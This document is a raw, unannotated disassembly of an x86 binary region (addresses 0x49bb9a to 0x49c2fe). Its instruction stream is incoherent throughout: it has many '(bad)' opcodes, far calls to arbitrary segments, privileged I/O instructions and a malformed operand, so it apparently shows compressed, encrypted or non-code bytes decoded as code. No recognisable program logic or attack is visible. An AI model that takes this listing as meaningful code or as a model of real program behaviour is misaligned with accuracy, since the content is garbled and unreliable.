  49bb9a:	push   0xb51d3e8b
  49bb9f:	pop    es
  49bba0:	push   ebp
  49bba1:	xchg   ebx,eax
  49bba2:	stos   BYTE PTR es:[edi],al
  49bba3:	and    al,0x8d
  49bba5:	xchg   esi,eax
  49bba6:	mov    BYTE PTR [ebx-0x43],al
  49bba9:	add    BYTE PTR [esi],dl
  49bbab:	or     al,0x22
  49bbad:	adc    al,0x12
  49bbaf:	mov    WORD PTR [edi],fs
  49bbb1:	pusha  
  49bbb2:	popa   
  49bbb3:	mov    edx,0xd1d63cbb
  49bbb8:	xor    al,0xf
  49bbba:	call   0xdce2:0x6c063c05
  49bbc1:	xchg   edx,eax
  49bbc2:	push   0x41e34601
  49bbc7:	cmp    ch,ah
  49bbc9:	push   ds
  49bbca:	mul    DWORD PTR [eax]
  49bbcc:	adc    al,0x7c
  49bbce:	ss push eax
  49bbd0:	push   edi
  49bbd1:	data16 into 
  49bbd3:	in     eax,0xaa
  49bbd5:	call   0xd28d:0xa99e8a9a
  49bbdc:	push   eax
  49bbdd:	mov    edi,esi
  49bbdf:	mov    BYTE PTR [ebp-0x7e069beb],cl
  49bbe5:	jne    0x49bc23
  49bbe7:	in     al,0xf
  49bbe9:	mov    esp,0xd895219a
  49bbee:	cmc    
  49bbef:	push   ss
  49bbf0:	push   edx
  49bbf1:	jb     0x49bb85
  49bbf3:	xchg   edi,eax
  49bbf4:	xchg   ebx,eax
  49bbf5:	call   0x3b51:0x9af5db51
  49bbfc:	inc    edi
  49bbfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49bbfe:	ins    BYTE PTR es:[edi],dx
  49bbff:	inc    ecx
  49bc00:	dec    ecx
  49bc01:	push   ss
  49bc02:	jge    0x49bb9b
  49bc04:	push   ebx
  49bc05:	lea    edx,[edi-0x64]
  49bc08:	cmc    
  49bc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49bc0a:	call   0x959a:0x2c8fb251
  49bc11:	cmc    
  49bc12:	scas   al,BYTE PTR es:[edi]
  49bc13:	mov    esp,0x15de2d0d
  49bc18:	hlt    
  49bc19:	sahf   
  49bc1a:	retf   0x75fd
  49bc1d:	orps   xmm6,XMMWORD PTR [edi+0x7c]
  49bc21:	fld    QWORD PTR ds:0x4e19ca2b
  49bc27:	xor    eax,DWORD PTR [edi]
  49bc29:	xor    eax,0xfc68269f
  49bc2e:	pop    esi
  49bc2f:	mov    cl,BYTE PTR [ecx]
  49bc31:	adc    al,0x47
  49bc33:	outs   dx,DWORD PTR ds:[esi]
  49bc34:	fdivr  st,st(3)
  49bc36:	xchg   BYTE PTR [ecx],bl
  49bc38:	mov    ds:0x6c7a113,al
  49bc3d:	pop    ss
  49bc3e:	loope  0x49bc7d
  49bc40:	inc    ebx
  49bc41:	xor    eax,0x1fb3195e
  49bc46:	xor    eax,0xc2e35086
  49bc4b:	inc    ebx
  49bc4c:	pushf  
  49bc4d:	sbb    BYTE PTR [ecx+0x69986b93],bh
  49bc53:	aam    0x2c
  49bc55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49bc56:	xchg   edx,eax
  49bc57:	mov    edi,0xe4ddb9f5
  49bc5c:	jmp    0x49bc52
  49bc5e:	xchg   edi,eax
  49bc5f:	cmp    DWORD PTR ds:0xf4d42c6d,0xffffffb8
  49bc66:	cmc    
  49bc67:	push   cs
  49bc68:	mov    eax,0xc1ad15b9
  49bc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49bc6e:	and    BYTE PTR [ecx+0x76f4a91c],dl
  49bc74:	mov    al,ds:0x488d56a7
  49bc79:	mov    bl,al
  49bc7b:	rol    DWORD PTR ds:0x9bc12977,0x2f
  49bc82:	push   es
  49bc83:	out    dx,eax
  49bc84:	(bad)  
  49bc85:	sbb    esi,DWORD PTR [edi-0xa1aee4a]
  49bc8b:	lods   al,BYTE PTR ds:[esi]
  49bc8c:	and    eax,0x2eede264
  49bc91:	dec    edx
  49bc92:	adc    BYTE PTR [ebx-0x7ec54853],bl
  49bc98:	popa   
  49bc99:	lahf   
  49bc9a:	adc    eax,DWORD PTR [ebx]
  49bc9c:	jns    0x49bc62
  49bc9e:	cmc    
  49bc9f:	call   0x4c67:0x652ec17c
  49bca6:	cdq    
  49bca7:	dec    edi
  49bca8:	xor    eax,0xbe1418d
  49bcad:	or     al,0x9b
  49bcaf:	xchg   ebx,eax
  49bcb0:	sti    
  49bcb1:	pop    edx
  49bcb2:	dec    ebx
  49bcb3:	or     cl,BYTE PTR [ecx-0x68daef46]
  49bcb9:	xor    DWORD PTR [esi],edi
  49bcbb:	push   edx
  49bcbc:	ror    BYTE PTR [edi-0x576520bd],0x8b
  49bcc3:	adc    eax,esp
  49bcc5:	popa   
  49bcc6:	sbb    BYTE PTR [esi],bh
  49bcc8:	sahf   
  49bcc9:	ret    0x3cf3
  49bccc:	arpl   WORD PTR [esi-0x42],dx
  49bccf:	call   0xd88b8b80
  49bcd4:	mov    eax,DWORD PTR [ebx]
  49bcd6:	shl    ebx,0x5d
  49bcd9:	and    esi,DWORD PTR [ebx+0x41]
  49bcdc:	mov    DWORD PTR [ecx],esi
  49bcde:	jae    0x49bc8b
  49bce0:	lods   eax,DWORD PTR ds:[esi]
  49bce1:	push   0xffffffa4
  49bce3:	pop    ds
  49bce4:	jnp    0x49bc7b
  49bce6:	mov    eax,ds:0x7693c869
  49bceb:	mov    ds:0x409c6fd5,eax
  49bcf0:	mov    esi,0x5d098c4
  49bcf5:	dec    edi
  49bcf6:	icebp  
  49bcf7:	cdq    
  49bcf8:	add    dl,dh
  49bcfa:	nop
  49bcfb:	xchg   ebx,eax
  49bcfc:	mov    esp,0x99f152
  49bd01:	cdq    
  49bd02:	add    BYTE PTR [edi+0x7d15b0e9],ch
  49bd08:	adc    esi,ecx
  49bd0a:	outs   dx,DWORD PTR ds:[esi]
  49bd0b:	cdq    
  49bd0c:	add    BYTE PTR [edx+edi*1],ch
  49bd0f:	xchg   edi,eax
  49bd10:	and    ebp,DWORD PTR [edx]
  49bd12:	icebp  
  49bd13:	fisub  WORD PTR [ebp+0x327df4d7]
  49bd19:	enter  0x4e6d,0x75
  49bd1d:	sub    al,0x6d
  49bd1f:	cdq    
  49bd20:	cmp    eax,ecx
  49bd22:	or     DWORD PTR [edx-0x66d366d4],edx
  49bd28:	sub    al,0x2a
  49bd2a:	in     al,0x25
  49bd2c:	daa    
  49bd2d:	cdq    
  49bd2e:	sub    al,0x99
  49bd30:	sub    al,0xc8
  49bd32:	dec    ecx
  49bd33:	dec    esi
  49bd34:	jb     0x49bcde
  49bd36:	mov    esp,0x2c99f064
  49bd3b:	xchg   ecx,eax
  49bd3c:	cmp    al,0x2
  49bd3e:	jns    0x49bd8d
  49bd40:	lock and dh,al
  49bd43:	pop    eax
  49bd44:	and    eax,0x2c997927
  49bd49:	cdq    
  49bd4a:	sub    al,0x27
  49bd4c:	sub    BYTE PTR [ecx+0x3b],0xef
  49bd50:	adc    DWORD PTR [ebp-0x67],ebp
  49bd53:	sub    al,0xb0
  49bd55:	dec    edx
  49bd56:	dec    esi
  49bd57:	and    DWORD PTR [ecx+0xe12532c],ebx
  49bd5d:	jno    0x49bd94
  49bd5f:	push   0x7a
  49bd61:	pop    esp
  49bd62:	shl    DWORD PTR [edi-0x7c],cl
  49bd65:	lock mov esi,0x416d49a9
  49bd6b:	xchg   edi,eax
  49bd6c:	fs in  eax,0x83
  49bd6f:	cdq    
  49bd70:	pop    edx
  49bd71:	mov    edx,DWORD PTR [ecx]
  49bd73:	cmp    eax,0xeb4d40ef
  49bd78:	cmp    BYTE PTR [ecx+0x2c],bl
  49bd7b:	ror    DWORD PTR [ecx+ecx*1-0x20],0x16
  49bd80:	mov    ebp,0x483c8146
  49bd85:	push   ecx
  49bd86:	aas    
  49bd87:	sub    DWORD PTR [ecx-0x6346e922],eax
  49bd8d:	inc    ebx
  49bd8e:	sbb    ecx,DWORD PTR [ebx-0x6e2568f8]
  49bd94:	sbb    DWORD PTR [eax+0x22],0x53
  49bd98:	xchg   ecx,eax
  49bd99:	ds pop eax
  49bd9b:	mov    ds,WORD PTR [ebx+esi*8+0x57d5a3ee]
  49bda2:	cdq    
  49bda3:	lds    edx,FWORD PTR [esi]
  49bda5:	xchg   BYTE PTR [ebx+0xc50d512],bl
  49bdab:	jmp    0x1ab16fbe
  49bdb0:	das    
  49bdb1:	ffreep st(1)
  49bdb3:	pop    edx
  49bdb4:	js     0x49bdda
  49bdb6:	adc    BYTE PTR [eax+0x52],0x49
  49bdba:	shr    DWORD PTR [edx+0x35411972],1
  49bdc0:	and    BYTE PTR [edx+esi*8+0x7],bh
  49bdc4:	xor    dh,BYTE PTR [eax-0x1b]
  49bdc7:	adc    al,0x8c
  49bdc9:	adc    bh,BYTE PTR [esi-0x3f393dd]
  49bdcf:	mov    eax,ds:0xb00dfd08
  49bdd4:	loop   0x49be21
  49bdd6:	jo     0x49bdfb
  49bdd8:	sbb    esp,ecx
  49bdda:	cmp    DWORD PTR [ebx+0x45034430],0xffffff85
  49bde1:	sub    al,0x8a
  49bde3:	inc    eax
  49bde4:	add    DWORD PTR ds:0x4034fb85,ecx
  49bdea:	stos   DWORD PTR es:[edi],eax
  49bdeb:	sub    bl,BYTE PTR [edi+esi*4]
  49bdee:	dec    eax
  49bdef:	ret    
  49bdf0:	adc    dl,dl
  49bdf2:	test   DWORD PTR [edx+0x57],edx
  49bdf5:	icebp  
  49bdf6:	inc    ebx
  49bdf7:	jo     0x49bda8
  49bdf9:	mov    ebx,DWORD PTR [esi-0x5323808a]
  49bdff:	push   edx
  49be00:	adc    BYTE PTR [edi],cl
  49be02:	mov    eax,ds:0x14f7674
  49be07:	push   eax
  49be08:	push   0x84b2b386
  49be0d:	adc    BYTE PTR [ecx+0x5d],bl
  49be10:	inc    ebp
  49be11:	inc    edi
  49be12:	ret    0x292f
  49be15:	jg     0x49be2e
  49be17:	sub    eax,0x790019e4
  49be1c:	dec    eax
  49be1d:	test   eax,0x40f56a7
  49be22:	fisttp DWORD PTR [ebx+0x38436e6a]
  49be28:	sbb    ecx,DWORD PTR [eax-0x22]
  49be2b:	dec    edx
  49be2c:	js     0x49be39
  49be2e:	push   cs
  49be2f:	pop    esi
  49be30:	xor    dl,BYTE PTR [ecx+0x0]
  49be33:	cdq    
  49be34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49be35:	pop    ebx
  49be36:	sub    ecx,DWORD PTR [ebp+0x6d]
  49be39:	or     eax,0x6be40390
  49be3e:	ins    BYTE PTR es:[edi],dx
  49be3f:	and    DWORD PTR [esi+edx*4],edx
  49be42:	mov    al,0xaf
  49be44:	fwait
  49be45:	jae    0x49bdda
  49be47:	lods   al,BYTE PTR ds:[esi]
  49be48:	sub    al,0x41
  49be4a:	pop    eax
  49be4b:	test   eax,0x1f438d29
  49be50:	cmp    BYTE PTR ds:0x9fa09803,ah
  49be56:	mov    dl,0x60
  49be58:	or     edi,ecx
  49be5a:	adc    esp,DWORD PTR [edx]
  49be5c:	push   es
  49be5d:	fidivr WORD PTR [ecx-0x26c4ab03]
  49be63:	jb     0x49be80
  49be65:	mov    bl,0x5
  49be67:	add    DWORD PTR [edx],eax
  49be69:	add    eax,DWORD PTR [eax+edi*2]
  49be6c:	stos   BYTE PTR es:[edi],al
  49be6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49be6e:	stc    
  49be6f:	mov    esp,0xb4d556b6
  49be74:	data16 jmp 0x49be7d
  49be77:	clc    
  49be78:	push   ebx
  49be79:	mov    ch,0x3a
  49be7b:	dec    edi
  49be7c:	repz jns 0x49be1d
  49be7f:	inc    esi
  49be80:	lahf   
  49be81:	test   BYTE PTR [edx],0xb6
  49be84:	xor    DWORD PTR [ebp-0x5e92650d],ebx
  49be8a:	mov    dh,0x86
  49be8c:	pop    esi
  49be8d:	or     eax,0x2f0622b8
  49be92:	out    0xf3,al
  49be94:	cmp    al,0xcf
  49be96:	mov    dh,BYTE PTR [ecx+0x7d]
  49be99:	(bad)  
  49be9a:	sub    eax,0x79c64cb9
  49be9f:	sahf   
  49bea0:	cmp    DWORD PTR [eax-0x2c],ebp
  49bea3:	sub    DWORD PTR es:[ebp+0x60],edi
  49bea7:	xor    al,0x11
  49bea9:	mov    esp,0x44d89b6
  49beae:	sbb    al,0x27
  49beb0:	ret    
  49beb1:	pop    esi
  49beb2:	xchg   esi,eax
  49beb3:	xchg   esp,eax
  49beb4:	jo     0x49bf1e
  49beb6:	or     ch,bl
  49beb8:	dec    bl
  49beba:	addr16 add al,0xe
  49bebd:	xchg   esp,eax
  49bebe:	xchg   DWORD PTR [edi-0x56ef8a5c],eax
  49bec4:	(bad)  [edi]
  49bec6:	adc    al,0x58
  49bec8:	jge    0x49befd
  49beca:	and    al,0x5c
  49becc:	and    BYTE PTR [edi+0x23],al
  49becf:	jg     0x49bf45
  49bed1:	sbb    bl,al
  49bed3:	push   esi
  49bed4:	ins    BYTE PTR es:[edi],dx
  49bed5:	sub    DWORD PTR [ecx],esi
  49bed7:	push   0x72
  49bed9:	ret    
  49beda:	(bad)
  49bedd:	pop    ecx
  49bede:	or     bh,dh
  49bee0:	mov    al,0x91
  49bee2:	fwait
  49bee3:	mov    edi,ebx
  49bee5:	out    dx,al
  49bee6:	cmp    BYTE PTR [ebx-0xb5c64e8],0x98
  49beed:	je     0x49bf08
  49beef:	add    eax,0x333d80ae
  49bef4:	(bad)  
  49bef5:	ret    0xffa3
  49bef8:	adc    dh,BYTE PTR [edi+0xd]
  49befb:	add    al,0xb9
  49befd:	ja     0x49bed1
  49beff:	add    dl,BYTE PTR [esi+edx*2]
  49bf02:	call   0xd6af:0x1e0118a3
  49bf09:	xor    eax,0xc2485385
  49bf0e:	mov    cl,0x79
  49bf10:	mov    ecx,0xfa898814
  49bf15:	cld    
  49bf16:	mov    ecx,0xfe020f51
  49bf1b:	dec    DWORD PTR [ebx+0x4cf4454d]
  49bf21:	xor    esp,DWORD PTR [eax+ebx*2]
  49bf24:	stc    
  49bf25:	mov    eax,ds:0x74a7ec73
  49bf2a:	inc    eax
  49bf2b:	cwde   
  49bf2c:	jne    0x49bf14
  49bf2e:	scas   eax,DWORD PTR es:[edi]
  49bf2f:	icebp  
  49bf30:	outs   dx,DWORD PTR ds:[esi]
  49bf31:	ficomp WORD PTR [ebp-0x778d5d6d]
  49bf37:	mov    ds:0x388368a1,eax
  49bf3c:	adc    DWORD PTR [edi-0x17],ebp
  49bf3f:	fdiv   QWORD PTR [esp+ecx*2-0x1be3d3e6]
  49bf46:	pop    ebx
  49bf47:	add    dl,dl
  49bf49:	jecxz  0x49bf9b
  49bf4b:	scas   al,BYTE PTR es:[edi]
  49bf4c:	jbe    0x49bf97
  49bf4e:	sbb    BYTE PTR [ecx],dl
  49bf50:	and    BYTE PTR [ebp+0x2f49508],ah
  49bf56:	dec    ebp
  49bf57:	xor    ebx,ebx
  49bf59:	and    dh,BYTE PTR [ebp+ebp*1-0x76aad8c5]
  49bf60:	pop    ebp
  49bf61:	daa    
  49bf62:	jb     0x49bef8
  49bf64:	inc    eax
  49bf65:	and    al,0xe4
  49bf67:	adc    al,0x81
  49bf69:	and    al,0x8c
  49bf6b:	fdiv   QWORD PTR [ebp-0x1f2b13e8]
  49bf71:	dec    ebp
  49bf72:	mov    WORD PTR [ebx-0x3c4e4eea],ds
  49bf78:	jb     0x49bfa6
  49bf7a:	loope  0x49bf8b
  49bf7c:	dec    ecx
  49bf7d:	fwait
  49bf7e:	push   ebp
  49bf7f:	fdivr  QWORD PTR [eax+ecx*2+0x27698c12]
  49bf86:	jne    0x49bf48
  49bf88:	xchg   ecx,eax
  49bf89:	fsubr  QWORD PTR [edi+0x8f88829]
  49bf8f:	jne    0x49bfa1
  49bf91:	xor    ebp,DWORD PTR [esi+0x7]
  49bf94:	mov    BYTE PTR [edi-0x404f6a80],ch
  49bf9a:	and    eax,0xa80cc3f7
  49bf9f:	mov    eax,ds:0x4dd90563
  49bfa4:	xor    esi,esi
  49bfa6:	inc    esi
  49bfa7:	iret   
  49bfa8:	call   0x5726c7ae
  49bfad:	cmp    al,0x13
  49bfaf:	mov    es,edx
  49bfb1:	mov    ch,0x81
  49bfb3:	(bad)  
  49bfb5:	dec    eax
  49bfb6:	sub    eax,edx
  49bfb8:	and    al,0xa7
  49bfba:	imul   ebx,DWORD PTR [edi],0xfaf4bd38
  49bfc0:	scas   eax,DWORD PTR es:[edi]
  49bfc1:	mov    DWORD PTR [ebp+0x569c8190],ecx
  49bfc7:	push   esi
  49bfc8:	lahf   
  49bfc9:	rcl    DWORD PTR [edx-0x2d6ae488],0xc7
  49bfd0:	push   edi
  49bfd1:	mov    edx,0x75092443
  49bfd6:	jge    0x49bfe8
  49bfd8:	fistp  QWORD PTR [ecx+esi*2+0xeee1819]
  49bfdf:	ds pop es
  49bfe1:	pushf  
  49bfe2:	mov    ebx,0x27e1054c
  49bfe7:	jecxz  0x49bf95
  49bfe9:	xor    al,BYTE PTR [esi+eax*1]
  49bfec:	inc    esi
  49bfed:	inc    ebx
  49bfee:	retf   
  49bfef:	and    eax,0xac02b40e
  49bff4:	adc    al,0x19
  49bff6:	fs xor eax,0x87573ce
  49bffc:	mov    dh,0x30
  49bffe:	mov    eax,0x67840056
  49c003:	(bad)  
  49c004:	les    ecx,FWORD PTR [ebx+0x68]
  49c007:	xchg   ecx,eax
  49c008:	jge    0x49c06e
  49c00a:	std    
  49c00b:	ja     0x49c046
  49c00d:	sbb    DWORD PTR [edx+edx*1-0x72],ebp
  49c011:	push   ss
  49c012:	popa   
  49c013:	pop    ebx
  49c014:	push   0x49
  49c016:	sub    ebp,DWORD PTR [edx]
  49c018:	mov    edx,0x9dccf74e
  49c01d:	ret    0x104e
  49c020:	fidivr DWORD PTR [edi+0x49262300]
  49c026:	xor    ch,bh
  49c028:	dec    ecx
  49c029:	(bad)  
  49c02a:	popa   
  49c02b:	in     al,0x83
  49c02d:	add    DWORD PTR [eax],eax
  49c02f:	lods   al,BYTE PTR ds:[esi]
  49c030:	popa   
  49c031:	mov    ds:0xb6c71250,al
  49c036:	aaa    
  49c037:	xchg   ebx,eax
  49c038:	mov    al,0xb3
  49c03a:	pusha  
  49c03b:	pushf  
  49c03c:	push   ecx
  49c03d:	sbb    edi,DWORD PTR [edi+eax*2-0x56cf34ec]
  49c044:	jb     0x49c0a9
  49c046:	inc    ebp
  49c047:	push   0x6f
  49c049:	aaa    
  49c04a:	leave  
  49c04b:	mov    WORD PTR [eax+0x4b],ss
  49c04e:	ja     0x49c02c
  49c050:	inc    ebx
  49c051:	or     edi,eax
  49c053:	xchg   esp,eax
  49c054:	dec    ecx
  49c055:	adc    cl,BYTE PTR [esi]
  49c057:	inc    esi
  49c058:	sub    al,0x70
  49c05a:	jno    0x49c09e
  49c05c:	mov    al,ds:0x7743f063
  49c061:	fs dec ecx
  49c063:	cmp    al,0x4
  49c065:	aam    0x98
  49c067:	sbb    ah,BYTE PTR [esi+0x40]
  49c06a:	in     al,dx
  49c06b:	xor    BYTE PTR [eax+0x38],dl
  49c06e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49c06f:	sbb    ah,BYTE PTR [ecx-0x7f]
  49c072:	sub    cl,BYTE PTR [edx+eiz*1]
  49c075:	outs   dx,BYTE PTR ds:[esi]
  49c076:	dec    edx
  49c077:	mov    ah,cl
  49c079:	mov    ebx,0x1a4978b0
  49c07e:	ret    0x9f3
  49c081:	movaps XMMWORD PTR [eax],xmm7
  49c084:	lea    esp,[esp+ecx*8-0x16c06173]
  49c08b:	shl    BYTE PTR [ebx+ecx*4],0x4d
  49c08f:	nop
  49c090:	das    
  49c091:	mov    cl,0x9b
  49c093:	dec    ebp
  49c094:	xchg   edx,eax
  49c095:	lock push ss
  49c097:	adc    al,0xc5
  49c099:	shl    DWORD PTR [eax+0x7b612548],cl
  49c09f:	sub    BYTE PTR [ebx],cl
  49c0a1:	xchg   esi,eax
  49c0a2:	lahf   
  49c0a3:	(bad)  
  49c0a4:	fisub  DWORD PTR [ebx+0x55]
  49c0a7:	nop
  49c0a8:	inc    edx
  49c0a9:	mov    DWORD PTR [edi],edx
  49c0ab:	jnp    0x49c03a
  49c0ad:	(bad)  
  49c0ae:	data16 jp 0x49c0c6
  49c0b1:	jbe    0x49c08d
  49c0b3:	pushf  
  49c0b4:	push   edx
  49c0b5:	jae    0x49c05b
  49c0b7:	sub    eax,0x1c743bd8
  49c0bc:	xchg   ecx,eax
  49c0bd:	(bad)  [edx+0x654ac694]
  49c0c3:	adc    eax,0x5ed6494f
  49c0c8:	xchg   edx,eax
  49c0c9:	daa    
  49c0ca:	sbb    dl,BYTE PTR [ecx+0x71528c55]
  49c0d0:	call   0xd157:0xf61a994d
  49c0d7:	xor    al,0xda
  49c0d9:	inc    edx
  49c0da:	(bad)  
  49c0db:	ficom  DWORD PTR [ebx]
  49c0dd:	xlat   BYTE PTR ds:[ebx]
  49c0de:	inc    ebx
  49c0df:	fstp   TBYTE PTR [eax]
  49c0e1:	lods   eax,DWORD PTR ds:[esi]
  49c0e2:	push   ebp
  49c0e3:	les    edx,FWORD PTR [edx+0x35]
  49c0e6:	test   cl,dl
  49c0e8:	fisubr WORD PTR [esi+0x4b]
  49c0eb:	pop    ebp
  49c0ec:	int3   
  49c0ed:	inc    ebx
  49c0ee:	or     ebp,edx
  49c0f0:	int3   
  49c0f1:	cmp    BYTE PTR [edi+0x2d1ce705],0x99
  49c0f8:	mov    ebp,0xf2f34dd3
  49c0fd:	push   ss
  49c0fe:	shr    DWORD PTR [ebx+0x26890210],1
  49c104:	push   0x70483c76
  49c109:	test   BYTE PTR [ebx],0x39
  49c10c:	retf   0xfb10
  49c10f:	push   ecx
  49c110:	(bad)  
  49c111:	lahf   
  49c112:	in     eax,dx
  49c113:	cmp    BYTE PTR [ebp+0xf],0x1
  49c117:	inc    ebp
  49c118:	test   dl,dl
  49c11a:	and    bl,BYTE PTR [esi-0x3a]
  49c11d:	scas   eax,DWORD PTR es:[edi]
  49c11e:	dec    esi
  49c11f:	fucomi st,st(6)
  49c121:	dec    ecx
  49c122:	mov    DWORD PTR [eax-0xe78a60c],ecx
  49c128:	rol    dh,1
  49c12a:	sti    
  49c12b:	push   ecx
  49c12c:	jbe    0x49c0b9
  49c12e:	(bad)  
  49c12f:	jbe    0x49c191
  49c131:	pusha  
  49c132:	add    BYTE PTR [ecx+ebp*4],0xe5
  49c136:	loope  0x49c0d3
  49c138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c139:	punpckhwd mm7,QWORD PTR [eax-0x73]
  49c13d:	or     al,0x82
  49c13f:	mov    edx,DWORD PTR [ecx]
  49c141:	fsubr  st(5),st
  49c143:	sbb    DWORD PTR [eax],esp
  49c145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c146:	or     al,BYTE PTR [ecx]
  49c148:	add    BYTE PTR [ecx],al
  49c14a:	adc    BYTE PTR [eax+0x2d25b10e],dh
  49c150:	test   esi,eax
  49c152:	aad    0xa0
  49c154:	repnz std 
  49c156:	inc    esi
  49c157:	push   ebp
  49c158:	sti    
  49c159:	mov    esi,0x353b7b84
  49c15e:	push   DWORD PTR [eax+0xf23e08e]
  49c164:	push   0x5
  49c166:	std    
  49c167:	mov    ah,0x54
  49c169:	ds repz push edi
  49c16c:	adc    cl,BYTE PTR [ebp+eax*4+0x54]
  49c170:	stc    
  49c171:	mov    ebx,0xf55f0a06
  49c176:	in     al,dx
  49c177:	cmp    DWORD PTR [esi+0x18],eax
  49c17a:	cmp    al,0x2f
  49c17c:	dec    esi
  49c17d:	add    al,0x24
  49c17f:	mov    cl,0xc9
  49c181:	push   0x8b8e81e6
  49c186:	or     ebx,ebp
  49c188:	jbe    0x49c129
  49c18a:	fist   WORD PTR [ebp+0x208b151a]
  49c190:	jecxz  0x49c207
  49c192:	fstp   st(3)
  49c194:	mov    esp,0x79f48eef
  49c199:	inc    eax
  49c19a:	jo     0x49c1d7
  49c19c:	jb     0x49c169
  49c19e:	sbb    ecx,esi
  49c1a0:	sbb    ah,BYTE PTR [ebp-0x41]
  49c1a3:	mul    edx
  49c1a5:	clc    
  49c1a6:	or     al,BYTE PTR [esi+0x4dff21f8]
  49c1ac:	dec    ebp
  49c1ad:	repnz push edx
  49c1af:	xchg   esp,eax
  49c1b0:	test   al,0x89
  49c1b2:	ss jbe 0x49c1aa
  49c1b5:	les    esp,FWORD PTR [ebp+eax*8-0x42e1f497]
  49c1bc:	mov    al,ds:0x1b51a4fa
  49c1c1:	mov    edx,DWORD PTR [ebx]
  49c1c3:	mov    al,0xa4
  49c1c5:	mov    ?,WORD PTR [edx]
  49c1c7:	clc    
  49c1c8:	dec    edx
  49c1c9:	mov    DWORD PTR [ecx+0x6ac2fdf4],edx
  49c1cf:	rcl    esi,1
  49c1d1:	data16 jg 0x49c225
  49c1d4:	jne    0x49c22f
  49c1d6:	sbb    eax,0xe343301c
  49c1db:	pop    edi
  49c1dc:	dec    ebp
  49c1dd:	or     ebp,esi
  49c1df:	add    cl,BYTE PTR [ecx-0x42]
  49c1e2:	xor    eax,0x4d52a455
  49c1e7:	jno    0x49c236
  49c1e9:	sub    al,0xf0
  49c1eb:	xchg   esi,eax
  49c1ec:	push   edi
  49c1ed:	sub    eax,ecx
  49c1ef:	pushf  
  49c1f0:	or     al,0x4f
  49c1f2:	call   0x8b8feff1
  49c1f7:	rcr    DWORD PTR [eax+0x4ba2b900],cl
  49c1fd:	cmp    al,0x2
  49c1ff:	jnp    0x49c26c
  49c201:	cmp    ah,cl
  49c203:	and    edi,DWORD PTR [edi-0x5]
  49c206:	clc    
  49c207:	or     BYTE PTR [ebp-0x64bb3cfe],al
  49c20d:	mov    ds:0xcde263a7,eax
  49c212:	les    edi,FWORD PTR [ebx+esi*8-0x80]
  49c216:	test   BYTE PTR [eax],0x3
  49c219:	push   ss
  49c21a:	faddp  st(4),st
  49c21c:	jne    0x49c242
  49c21e:	pop    esi
  49c21f:	ror    DWORD PTR [esi+0x7cdbe074],0xce
  49c226:	je     0x49c252
  49c228:	push   ebx
  49c229:	test   eax,0x92b4617d
  49c22e:	inc    ebx
  49c22f:	int    0x7c
  49c231:	push   ecx
  49c232:	lea    ebx,[ebx-0x4dfc48be]
  49c238:	xor    edx,edx
  49c23a:	adc    edx,DWORD PTR [edi+0x12]
  49c23d:	imul   ebp,DWORD PTR [ebx*2-0x6cd5df03],0x3c
  49c245:	rol    BYTE PTR [ebp+esi*4+0x4e57fb52],0x5
  49c24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49c24e:	jbe    0x49c274
  49c250:	push   edi
  49c251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c252:	int3   
  49c253:	or     BYTE PTR [edx+0x35],0xe6
  49c257:	xor    eax,0xcbb1a847
  49c25c:	jle    0x49c2a4
  49c25e:	mov    al,0xf0
  49c260:	sahf   
  49c261:	push   ebx
  49c262:	jge    0x49c1f4
  49c264:	pop    es
  49c265:	jmp    0x465c:0x264336aa
  49c26c:	pop    ss
  49c26d:	push   edi
  49c26e:	stos   BYTE PTR es:[edi],al
  49c26f:	xchg   ecx,eax
  49c270:	dec    esi
  49c271:	ins    DWORD PTR es:[edi],dx
  49c272:	loop   0x49c27d
  49c274:	cmp    ebx,0x53
  49c277:	lods   al,BYTE PTR ds:[esi]
  49c278:	sbb    BYTE PTR [edx+ebx*4+0x4b],0xd3
  49c27d:	adc    BYTE PTR [ecx+edi*2+0x55],dl
  49c281:	jo     0x49c2d9
  49c283:	add    eax,0x67d380dc
  49c288:	pop    ss
  49c289:	push   0xf68c2ac5
  49c28e:	cmp    eax,0xa3ea1b87
  49c293:	jo     0x49c23f
  49c295:	(bad)  
  49c297:	adc    BYTE PTR [ecx],dl
  49c299:	ss dec edx
  49c29b:	and    esp,DWORD PTR [eax-0x45]
  49c29e:	inc    ebp
  49c29f:	bound  edx,QWORD PTR [edi-0x752f2b9f]
  49c2a5:	inc    esp
  49c2a6:	mov    dh,BYTE PTR [edi+0x46]
  49c2a9:	and    eax,edx
  49c2ab:	dec    esi
  49c2ac:	cmp    DWORD PTR [edi],0x9c59e482
  49c2b2:	and    BYTE PTR [ebx-0x10],dl
  49c2b5:	pop    ebp
  49c2b6:	mov    al,0xd4
  49c2b8:	test   eax,0xe9485b61
  49c2bd:	jnp    0x49c2a5
  49c2bf:	sti    
  49c2c0:	stos   BYTE PTR es:[edi],al
  49c2c1:	cld    
  49c2c2:	pop    ds
  49c2c3:	pop    edx
  49c2c4:	cdq    
  49c2c5:	sbb    DWORD PTR [ebx],ebx
  49c2c7:	cdq    
  49c2c8:	sbb    DWORD PTR [ebp-0x53],edi
  49c2cb:	sbb    al,0x81
  49c2cd:	and    al,0x9e
  49c2cf:	fild   DWORD PTR [esi]
  49c2d1:	pop    ds
  49c2d2:	push   es
  49c2d3:	or     al,0x64
  49c2d5:	fsub   st,st(0)
  49c2d7:	stos   DWORD PTR es:[edi],eax
  49c2d8:	push   edi
  49c2d9:	fcmovb st,st(1)
  49c2db:	mov    al,ds:0xbe80f001
  49c2e0:	add    BYTE PTR [ebx+eax*1],0xb8
  49c2e4:	retf   0x6142
  49c2e7:	pusha  
  49c2e8:	fld    DWORD PTR [eax]
  49c2ea:	and    al,0xec
  49c2ec:	add    al,cl
  49c2ee:	ins    BYTE PTR es:[edi],dx
  49c2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49c2f0:	sub    eax,0xb4b01a18
  49c2f5:	or     eax,0xe5c209b8
  49c2fa:	enter  0xc4bc,0x1
  49c2fe:	enter  0x607a,0xeb
